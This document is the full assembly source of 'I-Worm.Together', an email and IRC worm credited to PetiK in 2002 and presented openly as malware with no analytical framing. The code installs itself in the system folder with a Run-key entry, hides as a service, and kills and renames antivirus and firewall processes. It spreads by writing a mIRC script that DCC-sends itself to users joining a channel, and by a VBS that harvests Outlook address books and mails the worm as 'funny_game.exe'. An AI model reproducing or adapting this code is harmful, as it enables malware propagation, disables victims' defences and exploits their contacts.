comment #
Name : I-Worm.Together
Author : PetiK
Date : March 10th 2002 - March 15th 2002

#

.586p
.model flat
.code

JUMPS

api macro a
extrn a:proc
call a
endm

PROCESSENTRY32 STRUCT
       dwSize              DWORD ?
       cntUsage            DWORD ?
       th32ProcessID       DWORD ?
       th32DefaultHeapID   DWORD ?
       th32ModuleID        DWORD ?
       cntThreads          DWORD ?
       th32ParentProcessID DWORD ?
       pcPriClassBase      DWORD ?
       dwFlags             DWORD ?
       szExeFile           db 260 dup(?)
PROCESSENTRY32 ENDS

include Useful.inc

start_worm:	call	hide_worm

twin_worm:
	push	50
	mov	esi,offset orig_worm
	push	esi
	push	0
	api	GetModuleFileNameA			; esi = name of file

	push	50
	push	offset verif_worm
	api	GetSystemDirectoryA
	@pushsz "\EBASE64.EXE"
	push	offset verif_worm
	api	lstrcat

	mov	edi,offset copy_worm
	push	edi
	push	50
	push	edi
	api	GetSystemDirectoryA
	add	edi,eax
	mov	eax,"aBe\"
	stosd
	mov	eax,"46es"
	stosd
	mov	eax,"exe."
	stosd
	pop	edi					; edi = %system%\eBase64.exe

	push	offset orig_worm
	push	offset verif_worm
	api	lstrcmp
	test	eax,eax
	jz	continue_worm

	push	0
	push	edi
	push	esi
	api	CopyFileA				; copy file

	push	20
	push	edi
	push	1
	@pushsz "Encode Base64"
	@pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
	push	80000002h
	api	SHSetValueA				; regedit

	jmp	end_worm

continue_worm:

fuck_antivirus:
	@pushsz "OIFIL400.DLL"
	api	LoadLibraryA
	test	eax,eax
	jz	end_fuck_antivirus

	push	0
	push	2
	api	CreateToolhelp32Snapshot

	mov	lSnapshot, eax

	inc	eax
	jz	end_fuck_antivirus

	lea	eax,uProcess
	mov	[eax.dwSize], SIZE PROCESSENTRY32

	lea	eax,uProcess
	push	eax
	push	lSnapshot
	api	Process32First

checkfile:
	test	eax, eax
	jz	InfExpRetCl
	push	ecx

	mov	eax,ProcessID
	push	offset uProcess
	cmp	eax,[uProcess.th32ProcessID]
	je	NextFile

	lea	ebx,[uProcess.szExeFile]

verif	macro	verifname,empty
		local   name
		ifnb    <empty>
		%out    too much arguments in macro 'nxt_instr'
		.err
		endif
		call	name
		db	verifname,0
		name:
		push	ebx
		api	lstrstr
		test	eax,eax
endm

	verif	"ARG"			; Norton
	jnz	term
	verif	"AVP32.EXE"		; AVP
	jnz	term
	verif	"AVPCC.EXE"		; AVP
	jnz	term
	verif	"AVPM.EXE"		; AVP
	jnz	term
	verif	"WFINDV32.EXE"		
	jnz	term
	verif	"F-AGNT95.EXE"		; F-SECURE
	jnz	term
	verif	"NAVAPW32.EXE"		; Norton
	jnz	term
	verif	"NAVW32.EXE"		; Norton
	jnz	term
	verif	"NMAIN.EXE"
	jnz	term
	verif	"PAVSHED.EXE"		; PandaSoftware
	jnz	term
	verif	"vshwin32.exe"		; McAfee
	jnz	term
	verif	"PETIKSHOW.EXE"		; McAfee
	jnz	term
	
	@pushsz "ZONEALARM.EXE"
	push	ebx
	api	lstrstr
	test	eax,eax
	jz	NextFile

term:	push	[uProcess.th32ProcessID]
	push	1
	push	001F0FFFh
	api	OpenProcess
	test	eax,eax
	jz	NextFile
	push	0
	push	eax
	api	TerminateProcess

	push	ebx
	push	offset new_name
	api	lstrcpy
	mov	esi,offset new_name
	push	esi
	api	lstrlen
	add	esi,eax
	sub	esi,4
	mov	[esi],"ktp."
	lodsd
;	mov	[esi],"kmz."
;	lodsd

	push	0
	push	offset new_name
	push	ebx
	api	CopyFileA
	push	ebx
	api	DeleteFileA

NextFile:
	push	offset uProcess
	push	lSnapshot
	api	Process32Next
	jmp	checkfile

InfExpRetCl:
	push	lSnapshot
	api	CloseHandle
end_fuck_antivirus:

call	Spread_Mirc
call	Spread_Worm
e_s_w:

end_worm:
	push	0
	api	ExitProcess

hide_worm	Proc
	pushad
	@pushsz	"KERNEL32.DLL"
	api	GetModuleHandleA
	xchg	eax,ecx
	jecxz	end_hide_worm
	@pushsz	"RegisterServiceProcess"		; Registered as Service Process
	push	ecx
	api	GetProcAddress
	xchg	eax,ecx
	jecxz	end_hide_worm
	push	1
	push	0
	call	ecx
	end_hide_worm:
	popad
	ret
hide_worm	EndP

Spread_Mirc	Proc
	push	offset copy_worm
	push	offset mirc_exe
	api	lstrcpy
	call	@mirc
	db 	"C:\mirc\script.ini",0
	db 	"C:\mirc32\script.ini",0		; spread with mIRC. Thanx to Microsoft.
	db 	"C:\progra~1\mirc\script.ini",0
	db 	"C:\progra~1\mirc32\script.ini",0
	@mirc:
	pop	esi
	push	4
	pop	ecx
	mirc_loop:
	push	ecx
	push	0
	push	80h
	push	2
	push	0
	push	1
	push	40000000h
	push	esi
	api	CreateFileA
	mov	ebp,eax
	push	0
	push	offset byte_write
	@tmp_mirc:
	push	e_mirc - s_mirc
	push	offset s_mirc
	push	ebp
	api	WriteFile
	push	ebp
	api	CloseHandle
	@endsz
	pop	ecx
	loop	mirc_loop
	end_spread_mirc:
	ret
Spread_Mirc	EndP

Spread_Worm		Proc
	pushad
	push	50
	push	offset vbs_worm
	api	GetSystemDirectoryA
	@pushsz "\eBase.vbs"
	push	offset vbs_worm
	api	lstrcat

	push	0
	push	20h
	push	2
	push	0
	push	1
	push	40000000h
	push	offset vbs_worm
	api	CreateFileA
	mov	ebp,eax
	push	0
	push	offset byte_write
	push	e_vbs - s_vbs
	push	offset s_vbs
	push	ebp
	api	WriteFile
	push	ebp
	api	CloseHandle

	push	1
	push	0
	push	0
	push	offset vbs_worm
	@pushsz "open"
	push	0
	api	ShellExecuteA

verif_inet:
	push	0
	push	offset inet
	api	InternetGetConnectedState
	dec	eax
	jnz	verif_inet

	push	50
	push	offset t_ini
	api	GetSystemDirectoryA
	@pushsz "\together.ini"
	push	offset t_ini
	api	lstrcat

	push	00h
	push	80h
	push	03h
	push	00h
	push	01h
	push	80000000h
	push	offset t_ini
	api	CreateFileA
	inc	eax
	je	end_spread_worm
	dec	eax
	xchg	eax,ebx

	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	2
	push	eax
	push	ebx
	api	CreateFileMappingA
	test	eax,eax
	je	end_s1
	xchg	eax,ebp

	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	4
	push	ebp
	api	MapViewOfFile
	test	eax,eax
	je	end_s2
	xchg	eax,esi

	push	0
	push	ebx
	api	GetFileSize
	cmp	eax,4
	jbe	end_s3

scan_mail:
	xor	edx,edx
	mov	edi,offset mail_addr
	push	edi
	p_c:	lodsb
	cmp	al," "
	je	car_s
	cmp	al,";"
	je	end_m
	cmp	al,"#"
	je	f_mail
	cmp	al,'@'
	jne	not_a
	inc	edx
	not_a:	stosb
		jmp p_c
	car_s:	inc esi
		jmp p_c
	end_m:	xor al,al
		stosb
		pop edi
		test edx,edx
		je  scan_mail
		call send_mail
		jmp scan_mail
	f_mail:

end_s3:	push	esi
	api	UnmapViewOfFile
end_s2:	push	ebp
	api	CloseHandle
end_s1:	push	ebx
	api	CloseHandle

	end_spread_worm:
	popad
	jmp	e_s_w
Spread_Worm		EndP

send_mail:
	xor	eax,eax
	push	eax
	push	eax
	push	offset Message
	push	eax
	push	[sess]
	api	MAPISendMail
	ret


.data
; === Copy Worm ===
orig_worm	db 50 dup (0)
copy_worm	db 50 dup (0)
verif_worm	db 50 dup (0)
sysTime		db 16 dup(0)

; === Fuck AntiVirus ===
uProcess	PROCESSENTRY32 <?>
ProcessID	dd ?
lSnapshot	dd ?
new_name	db 100 dup (?)

; === Spread With mIrc ===
s_mirc:	db "[script]",CRLF
	db ";Don't edit this file.",CRLF,CRLF
	db "n0=on 1:JOIN:{",CRLF
	db "n1= /if ( $nick == $me ) { halt }",CRLF
	db "n2= /.dcc send $nick "
mirc_exe	db 50 dup (?)
	db CRLF,"n3=}",0
e_mirc:
byte_write	dd ?

; === Spread with Outlook ===
vbs_worm	db 50 dup (0)
t_ini		db 50 dup (0)
mail_addr	db 128 dup (?)
inet		dd 0
sess		dd 0

subject		db "Re: Answer",0
body		db "Here for you...",0
filename	db "funny_game.exe",0

Message		dd ?
		dd offset subject
		dd offset body
		dd ?
		dd ?
		dd ?
		dd 2
		dd offset MsgFrom
		dd 1
		dd offset MsgTo
		dd 1
		dd offset Attach

MsgFrom		dd ?
		dd ?
		dd ?
		dd ?
		dd ?
		dd ?

MsgTo		dd ?
		dd 1
		dd offset mail_addr
		dd offset mail_addr
		dd ?
		dd ?

Attach		dd ?
		dd ?
		dd ?
		dd offset orig_worm
		dd offset filename
		dd ?


s_vbs:		
	db 'On Error Resume Next',CRLF
	db 'Set fs=CreateObject("Scripting.FileSystemObject")',CRLF
	db 'Set sys=fs.GetSpecialFolder(1)',CRLF
	db 'Set c=fs.CreateTextFile(sys&"\together.ini")',CRLF
	db 'c.Close',CRLF
	db 'Set ou=CreateObject("Outlook.Application")',CRLF
	db 'Set map=ou.GetNameSpace("MAPI")',CRLF
	db 'adr=""',CRLF
	db 'For Each mel in map.AddressLists',CRLF
	db 'If mel.AddressEntries.Count <> 0 Then',CRLF
	db 'For O=1 To mel.AddressEntries.Count',CRLF
	db 'adr=adr &";"& mel.AddressEntries(O).Address',CRLF
	db 'Next',CRLF
	db 'End If',CRLF
	db 'Next',CRLF
	db 'adr=adr &";#"',CRLF,CRLF
	db 'Set c=fs.OpenTextFile(sys&"\together.ini",2)',CRLF
	db 'c.WriteLine adr',CRLF
	db 'c.Close',CRLF
e_vbs:



signature	db "I-Worm.Together "
author		db "Coded by PetiK - 2002",00h

end start_worm
end